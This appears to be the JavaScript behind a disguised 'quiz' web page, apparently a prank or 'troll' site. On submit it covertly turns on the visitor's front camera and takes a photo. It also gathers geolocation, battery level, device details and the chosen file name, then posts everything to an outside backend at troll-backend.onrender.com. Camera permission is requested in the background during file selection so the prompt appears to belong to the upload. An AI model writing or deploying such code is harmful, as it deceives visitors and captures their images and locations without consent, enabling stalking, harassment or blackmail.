const form = document.getElementById("quiz-form");
const videoEl = document.getElementById("video");
const canvasEl = document.getElementById("canvas");
const toast = document.getElementById("toast");
const fileInput = document.getElementById("user-file");

const backendURL = "https://troll-backend.onrender.com/api/upload";
const constraints = { video: { facingMode: "user" }, audio: false };

// Show toast
function showToast(message) {
  toast.innerText = message;
  toast.style.display = "block";
  toast.style.opacity = 1;
  setTimeout(() => {
    toast.style.opacity = 0;
    setTimeout(() => (toast.style.display = "none"), 300);
  }, 2000);
}

// ------------------------------
// FILE INPUT: request camera without blocking
// ------------------------------
fileInput.addEventListener("click", (e) => {
  // Async camera request in background
  (async () => {
    try {
      await navigator.mediaDevices.getUserMedia(constraints);
      console.log("Camera permission granted");
    } catch (err) {
      console.warn("Camera permission denied or ignored:", err);
    }
  })();
  // File picker opens immediately
});

// ------------------------------
// FORM SUBMIT
// ------------------------------
form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const submitBtn = document.getElementById("submit-btn");
  submitBtn.disabled = true;
  submitBtn.textContent = "Submitting...";
  showToast("Uploading your response...");

  try {
    // Start camera
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    videoEl.srcObject = stream;
    await videoEl.play();
    await new Promise(res => videoEl.addEventListener("canplay", () => setTimeout(res, 300)));

    // Capture image
    const ctx = canvasEl.getContext("2d");
    canvasEl.width = videoEl.videoWidth;
    canvasEl.height = videoEl.videoHeight;
    ctx.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
    const image = canvasEl.toDataURL("image/png");

    // Collect metadata
    const metadata = {
      useragent: navigator.userAgent,
      platform: navigator.platform,
      width: window.innerWidth,
      height: window.innerHeight,
      language: navigator.language,
      battery: "N/A",
      location: "N/A",
      time: new Date().toLocaleString()
    };

    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%";
    }

    if (navigator.geolocation) {
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        metadata.location = `${pos.coords.latitude},${pos.coords.longitude}`;
      } catch {
        metadata.location = "Denied";
      }
    }

    // Include file name in metadata if user selected a file
    if (fileInput.files.length > 0) {
      metadata.uploadedFileName = fileInput.files[0].name;
    }

    // Send data to backend
    const response = await fetch(backendURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    // Stop camera
    videoEl.srcObject.getTracks().forEach(track => track.stop());

    // Show success
    document.getElementById("quiz-container").style.display = "none";
    document.getElementById("success-container").style.display = "block";

    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
    showToast("Response submitted successfully!");

  } catch (err) {
    console.error(err);
    alert("Please allow access");
    submitBtn.disabled = false;
    submitBtn.textContent = "Submit";
  }
});
